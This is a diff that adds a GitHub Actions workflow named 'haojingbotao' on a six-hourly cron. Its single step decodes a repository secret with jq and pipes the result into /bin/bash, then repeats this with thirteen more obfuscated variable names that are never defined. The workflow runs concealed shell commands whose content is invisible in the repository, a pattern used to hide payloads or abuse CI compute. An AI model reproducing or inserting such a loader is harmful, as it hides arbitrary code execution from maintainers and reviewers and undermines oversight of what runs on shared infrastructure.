@@ -1,0 +1,29 @@
+name: haojingbotao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haojingbotao
+        env:
+          ln3818: ${{ secrets.ln3818 }}
+        run: |
+          echo $ln3818 | jq -r .az72 | /bin/bash
+          echo $sfwlt98760 | jq -r .ffnif668 | /bin/bash
+          echo $yqn2959 | jq -r .woht0037 | /bin/bash
+          echo $tz40 | jq -r .vi06225 | /bin/bash
+          echo $poo143 | jq -r .uyq5114 | /bin/bash
+          echo $qmp724 | jq -r .dkalk248 | /bin/bash
+          echo $hb09 | jq -r .yu396 | /bin/bash
+          echo $dzff3 | jq -r .oi89623 | /bin/bash
+          echo $rhsbj72 | jq -r .gmc150 | /bin/bash
+          echo $owlan3 | jq -r .wdfs74 | /bin/bash
+          echo $ovdq18 | jq -r .hugwi98 | /bin/bash
+          echo $f6242 | jq -r .cd243 | /bin/bash
+          echo $cj00 | jq -r .k789 | /bin/bash
+          echo $dnk8 | jq -r .gopka30 | /bin/bash
+
